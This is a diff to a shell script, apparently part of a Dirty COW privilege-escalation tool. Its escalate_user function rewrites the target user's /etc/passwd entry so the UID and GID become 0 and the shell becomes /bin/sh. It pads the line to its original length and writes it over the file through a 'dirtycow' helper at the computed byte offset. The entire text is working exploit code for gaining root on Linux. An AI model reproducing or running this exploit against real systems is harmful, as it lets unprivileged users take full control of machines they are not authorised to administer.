@@ -19,36 +19,47 @@ backup /etc/passwd "$HOME/passwd"
 
 escalate_user() {
 	local user="$1"
-	local offset="$(grep --byte-offset "^$user" /etc/passwd | cut --delimiter=':' --fields=1)"
+	local offset="$(grep --byte-offset "^$user" /etc/passwd | cut --delimiter=':' --fields=1 | xargs printf "0x%x")"
 
 	awk -v FS=':' -v user="$user" '
 			BEGIN {
-				root_uid = 0;
-	
+				# important constants for script
+				root_uid = 0
+				new_shell = "/bin/sh"
+
 				# indices of important fields in /etc/passwd
-				i_uid = 3;
-				i_guid = 4;
-				i_comment = 5;
+				i_uid = 3
+				i_guid = 4
+				i_comment = 5
+				i_shell = 7
 			}
-	
+
 			$0 ~ "^"user {
-				for (i = 1; i <= i_comment; ++i) {
-					if (i < i_uid) {
-						printf $i;
-					} else if (i == i_uid || i == i_guid) {
-						padding += length($i) - length(root_uid);
-						printf root_uid;
-					} else {
-						printf $i;
-	
+				# calculate padding needed in comment field
+				padding += length($i_uid) - length(root_uid)
+				padding += length($i_guid) - length(root_uid)
+
+				shell_diff = length($i_shell) - length(new_shell)
+				padding += shell_diff > 0 ? shell_diff : 0
+
+				# edit record with root (G)UID, /bin/sh as shell
+				for (i = 1; i <= NF; ++i) {
+					if (i == i_uid || i == i_guid) {
+						printf root_uid
+					} else if (i == i_comment) {
 						# pad comment to line up with old end of comment
-						for (n = 0; n < padding; ++n) {
-							printf " ";
-						}
+						printf $i
+						for (n = 0; n < padding; ++n) printf " "
+					} else if (i == i_shell) {
+						printf new_shell
+					} else {
+						printf $i
 					}
-	
-					printf FS;
+
+					if (i != NF) printf FS;
 				}
+
+				printf RS
 			}' /etc/passwd \
 		| dirtycow -o "$offset" /etc/passwd
 }
